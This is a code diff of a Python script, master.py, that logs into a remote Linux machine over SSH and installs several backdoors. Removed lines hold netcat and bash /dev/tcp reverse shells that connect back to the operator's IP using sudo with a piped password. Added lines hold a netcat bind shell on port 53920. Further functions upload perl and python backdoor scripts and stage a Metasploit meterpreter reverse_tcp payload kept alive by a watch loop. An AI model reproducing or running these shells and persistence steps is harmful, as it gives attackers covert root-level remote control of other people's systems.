@@ -1,3 +1,4 @@
+vim master.py
 from paramiko import SSHClient
 from scp import SCPClient
 import paramiko
@@ -10,25 +11,14 @@ import subprocess
 # TODO: perl and python both will not work unless given an account with root. We could give the user an option of whether the account has root.
 # TODO: Give netcat root
 
-# Updated netcat, given root (nohup doesn't work ;(
-
 def scpFiles(filename, recur=True):#call this with a filename and false if it is a single file
     ssh.exec_command("rm " + filename)
     scp.put(filename, recursive=recur)
 
 def netcatBackdoor():
-    raw_input("Please enter the following command: nc -v -n -l -p 53920")
-    print("Initializing backdoor...")
-    ssh.exec_command("echo " + pword + " | sudo -S rm /tmp/f;")
-    ssh.exec_command("echo " + pword + " | sudo -S nohup mkfifo /tmp/f;")
-    ssh.exec_command("echo " + pword + " | sudo -S nohup cat /tmp/f|/bin/sh -i 2>&1 | sudo nohup nc " + newIP + " 53920 > /tmp/f")
-    print("Netcat backdoor on port 53920 attempted.")
-
-def bashBackdoor():
-    raw_input("Please enter the following command: nc -v -n -l -p 53923")
-    print("Initializing backdoor...")
-    ssh.exec_command("echo " +  pword + " | sudo -S nohup bash -i >& /dev/tcp/10.1.0.1/53923 0>&1")
-    print("Bash Backdoor on port 53923 attempted. You may need to input the password, which is " + pword)
+    ssh.exec_command("rm foo")
+    ssh.exec_command("nohup mkfifo foo ; nc -lk 53920 0<foo | /bin/bash 1>foo &")
+    print("Netcat backdoor on port 53920 attempted. Access this with nc " + hostname + " 53920")
 
 def perlBackdoor():
     toW = 'perl/prsA.pl'
@@ -72,7 +62,7 @@ def pythBackdoor():
     scpFiles('pythScript/pythBackdoor.py', False)
     print("Moving the backdoor script.")
     ssh.exec_command("echo " +  pword + " | sudo -S nohup python pythBackdoor.py")
-    print("Python backdoor on 53922 attempted.")
+    print("Note: if you don't give me root, this won't be happy. Python backdoor on 53922 attempted.")
 
 def metasploitBackdoor():
      cron = (raw_input("  + Press y to start backdoor as a cronjob (recommended): ") == 'y')
@@ -88,7 +78,7 @@ def metasploitBackdoor():
      print("use multi/handler\n \
      > set PAYLOAD linux/x86/meterpreter/reverse_tcp\n \
      > set LHOST %s\n \
-     > exploit", newIP)
+     > exploit", localIP)
      raw_input("Press any key to launch exploit once msfconsole is listening...")
      ssh.exec_command("watch -n1 nohup ./initd > /dev/null &")
      
@@ -120,8 +110,6 @@ if(raw_input('Press y to start a perl backdoor: ') == 'y'):
 	perlBackdoor()
 if(raw_input('Press y to start a python backdoor: ') == 'y'):
     pythBackdoor()
-if(raw_input('Press y to start a bash backdoor: ') == 'y'):
-    bashBackdoor()
 if(raw_input('Press y to start a metasploit backdoor: ') == 'y'):
     metasploitBackdoor()
 raw_input('Press any key to close the program.')
